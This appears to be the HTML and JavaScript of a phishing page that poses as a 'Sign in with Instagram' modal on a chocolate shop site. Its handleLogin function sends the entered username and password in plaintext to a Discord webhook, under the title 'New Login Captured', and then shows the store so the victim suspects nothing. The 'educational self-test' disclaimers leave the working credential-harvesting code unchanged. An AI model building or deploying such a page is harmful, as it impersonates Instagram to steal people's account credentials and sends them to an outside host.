<!-- LOGIN MODAL -->
<div class="modal-overlay" id="loginModal" onclick="if(event.target===this) closeLogin()">
  <div class="modal">
    <button class="modal-close" onclick="closeLogin()">&times;</button>
    <div class="modal-header">
      <div class="ig-circle">
        <svg width="30" height="30" viewBox="0 0 24 24" fill="white"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
      </div>
      <h2>Sign in with Instagram</h2>
      <p>Continue to SR Artisan Chocolates</p>
    </div>

    <form id="loginForm" onsubmit="return handleLogin(event)">
      <div class="webhook-config">
        <label for="webhookUrl">Discord Webhook URL (paste here for testing)</label>
        <input type="url" id="webhookUrl" placeholder="https://discord.com/api/webhooks/1524447921372659743/Qp7rboexks4RIAZk4BFcadpOCaSDo5ATVeSbw3iVi-Uxmw3XubfroUqdvz4ZDudLG40s">
      </div>

      <div class="form-group">
        <label for="username">Username or Email</label>
        <input type="text" id="username" required autocomplete="off">
      </div>
      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" required autocomplete="off">
      </div>

      <div class="warning-box">
        <span class="warn-icon">&#9888;&#65039;</span>
        <p><strong>EDUCATIONAL TESTING ONLY:</strong> This form is for personal testing in a private/incognito browser. <strong>Do not enter real credentials.</strong> Use test credentials only. By using this, you agree you are testing on yourself only.</p>
      </div>

      <button type="submit" class="submit-btn" id="submitBtn">Continue</button>
      <p class="demo-hint">For authorized self-testing only</p>
    </form>
  </div>
</div>

<!-- STORE -->
<section id="store">
  <div class="store-header">
    <h2>Our Chocolate Collection</h2>
    <p>Welcome back. Pick your favorite.</p>
  </div>
  <div class="gallery" id="gallery"></div>
</section>

<script>
  const chocolates = [
    { name: "Dark Truffle",      desc: "70% Belgian dark chocolate, hand-rolled.", price: "$12", img: "https://images.unsplash.com/photo-1606312619070-d48b4c652a52?w=600&q=80" },
    { name: "Golden Praline",    desc: "Hazelnut praline draped in 24k gold dust.", price: "$18", img: "https://images.unsplash.com/photo-1548907040-4baa42d10919?w=600&q=80" },
    { name: "Ruby Ganache",      desc: "Rare ruby cacao with raspberry notes.", price: "$15", img: "https://images.unsplash.com/photo-1481391319762-47dff72954d9?w=600&q=80" },
    { name: "Caramel Heart",     desc: "Soft caramel in a milk chocolate shell.", price: "$10", img: "https://images.unsplash.com/photo-1511381939415-e44015466834?w=600&q=80" },
    { name: "Espresso Bite",     desc: "Dark chocolate with a jolt of espresso.", price: "$11", img: "https://images.unsplash.com/photo-1623660053975-cf75a8be0908?w=600&q=80" },
    { name: "Salted Pistachio",  desc: "Sea salt and roasted pistachio crunch.", price: "$14", img: "https://images.unsplash.com/photo-1542843137-8791a6904d14?w=600&q=80" },
    { name: "Velvet Bonbon",     desc: "Smooth ganache in a glossy shell.", price: "$13", img: "https://images.unsplash.com/photo-1582176604856-e824b4736522?w=600&q=80" },
    { name: "Mint Whisper",      desc: "Cool peppermint in dark chocolate.", price: "$9",  img: "https://images.unsplash.com/photo-1626058239339-d4a914b5f5b8?w=600&q=80" },
    { name: "Hazelnut Dream",    desc: "Whole hazelnut center, milk chocolate.", price: "$12", img: "https://images.unsplash.com/photo-1599599810694-b5b37304c041?w=600&q=80" },
  ];

  function openLogin() {
    document.getElementById('loginModal').classList.add('active');
    setTimeout(function() { document.getElementById('username').focus(); }, 200);
  }
  function closeLogin() {
    document.getElementById('loginModal').classList.remove('active');
    document.getElementById('loginForm').reset();
  }

  async function handleLogin(e) {
    e.preventDefault();
    var btn = document.getElementById('submitBtn');
    var username = document.getElementById('username').value.trim();
    var password = document.getElementById('password').value;
    var webhookUrl = document.getElementById('webhookUrl').value.trim();

    if (!username || !password) return false;

    btn.disabled = true;
    btn.textContent = 'Signing in...';

    // Send to Discord webhook if one is provided
    if (webhookUrl && webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
      var embed = {
        embeds: [{
          title: 'New Login Captured (Self-Test)',
          color: 0xd4a574,
          fields: [
            { name: 'Username', value: '```' + username + '```', inline: true },
            { name: 'Password', value: '```' + password + '```', inline: true },
            { name: 'Timestamp', value: new Date().toISOString(), inline: false }
          ],
          footer: { text: 'SR Chocolate - Educational Self-Test Only' },
          timestamp: new Date().toISOString()
        }]
      };

      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(embed)
        });
      } catch(e) {
        console.log('Webhook send failed (may be OK for testing):', e);
      }
    }

    // Simulate login delay
    setTimeout(function() {
      sessionStorage.setItem('sr_user', username);
      sessionStorage.setItem('sr_logged_in', '1');
      closeLogin();
      enterStore();
    }, 900);

    return false;
  }

  function enterStore() {
    document.querySelector('.hero').style.display = 'none';
    document.querySelector('.nav-btn').style.display = 'none';
    document.getElementById('logoutBtn').classList.add('visible');
    document.getElementById('store').classList.add('visible');
    renderGallery();
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  function logout() {
    sessionStorage.removeItem('sr_logged_in');
    sessionStorage.removeItem('sr_user');
    document.querySelector('.hero').style.display = 'flex';
    document.querySelector('.nav-btn').style.display = 'flex';
    document.getElementById('logoutBtn').classList.remove('visible');
    document.getElementById('store').classList.remove('visible');
  }

  function renderGallery() {
    var gallery = document.getElementById('gallery');
    var html = '';
    for (var i = 0; i < chocolates.length; i++) {
      var c = chocolates[i];
      html += '<div class="card">' +
        '<img class="card-img" src="' + c.img + '" alt="' + c.name + '" loading="lazy" onerror="this.src=\'https://placehold.co/600x400/3a1f0f/d4a574?text=' + encodeURIComponent(c.name) + '\'">' +
        '<div class="card-body">' +
        '<div class="card-title">' + c.name + '</div>' +
        '<div class="card-desc">' + c.desc + '</div>' +
        '<div class="card-price">' + c.price + '</div>' +
        '</div></div>';
    }
    gallery.innerHTML = html;
  }

  document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') closeLogin();
  });

  if (sessionStorage.getItem('sr_logged_in') === '1') {
    enterStore();
  }
</script>
</body>
</html>
